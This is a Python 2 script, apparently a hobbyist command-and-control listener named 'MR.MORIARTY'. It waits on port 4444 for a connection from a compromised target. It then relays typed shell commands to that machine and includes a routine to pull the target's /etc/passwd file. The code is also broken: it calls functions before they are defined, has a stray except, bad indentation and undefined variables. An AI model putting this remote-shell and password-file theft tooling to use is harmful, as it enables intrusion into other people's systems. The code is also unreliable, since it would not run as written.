#A TCP server 
#MR.MORIARTY
#Author : SN0WD0X

import socket
import time
#from datetime import date 
import datetime
import threading
import os
import sys
import subprocess
from Crypto.Cipher import AES

server_ip = '192.168.8.103'
#hostname = socket.gethostname()
#server_ip = socket.gethostbyname(hostname)
server_port = 4444


today = datetime.date.today()
print 'DATE: ', today

#server_date = datetime.today()
#print 'DATE: %d' % (server_date)

def connect():
	try:
		#print(hostname)
		soc = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		soc.bind((server_ip,server_port)) #binding the ip and port
		soc.listen(1) #will listen for 1 incoming connections
		print '[+] Listening for incoming TCP port 8080'

		conn, addr = soc.accept() #<----will return the connection object ID(conn)and will help by maximum  length of the queue for pending connections

		print '[+] we got a connection from: %s:%d' % (addr[0], addr[1])
		#soc.send("HELLO")
		#soc.close()

	except socket.error,e:
		print "Socket creatiion failed:%s"%e


	while True:
		try:
			print 'My name is SHERLOCK HOLMES!'
			cmd = input("shell> ") # user input 
			#pkt = bytearray("\x1b" + cmd + "\x0d")
			#soc.send(pkt)
			soc.send(cmd)
			res = soc.recv(2048)
			print 'TO EXIT TYPE TERMINATE'
			if 'terminate' in cmd:
				conn.send('terminate')
				conn.close()
				time.sleep(1)
				break
			else:
				conn.send(cmd) # sending the commnad to the client || target
				print conn.recv(2048)
		except:
			print 'I WILL HUNT YOU DOWN, MORIARTY!'

	#while True:
	#	try:
#			soc.listen(1)#
		#	conn, (server_ip,server_port) = soc.accept()
		#	newthread = ClientThread(server_ip,server_port) 
    	#	newthread.start() 
    	#	threads.append(newthread)
    	#except:
    	#	print 'FAILED'

    	while True:
    		try:
    			conn, addr = soc.accept()
    			print "[+] Accepted connection from: %s:%d" % (addr[0],addr[1])
    			#spining up the client thread to handle incoming data
    			client_handler = threading.Thread(target=connect,args=(soc,))
    			client_handler.start()
    		except Typeerror:
    			print 'RETRY AGAIN!'

def encrypt(cmd):
	encrypto = AES.new(key, AES.MODE_CTR, counter=lambda: counter)
	return encrypto.encrypt(cmd)

def main():
	#grab_file()
	transfer()
	connect()
	encrypt()

main()

#pkt = bytearray("\x1b" + cmd + "\x0d")
#soc.send(pkt)
#def grab_file():
#	try:
	#print 'DO you want the password file?'
#		answer = raw_input('Do you want the password file?')
#		if 'Y' or 'yes' in answer:
#			transfer()
#		else:
#			print 'yousuck'
#	except:
#		print 'ERROR'
			#else:
			#	print 'YOU SUCK'

def transfer(conn, cmd):
	conn.send(cmd)
	print 'DO you want the password file?'
		answer = raw_input('Do you want the password file?')
		if 'Y' or 'yes' in answer:
			conn.send(answer)
		else:
			print 'yousuck'
	except:
		print 'ERROR'

	file = fopen('/etc/passwd', 'wb')
	while True:
		f_bits = conn.recv(2048)
		if 'Unable to Find the file' in f_bits:
			print 'UNABLE TO FIND THE FILE'
			break
		elif f_bits.endswith('DONE'):
			print 'FILE IS YOURS'
			file.close()
			break
		f.write(bits)
		
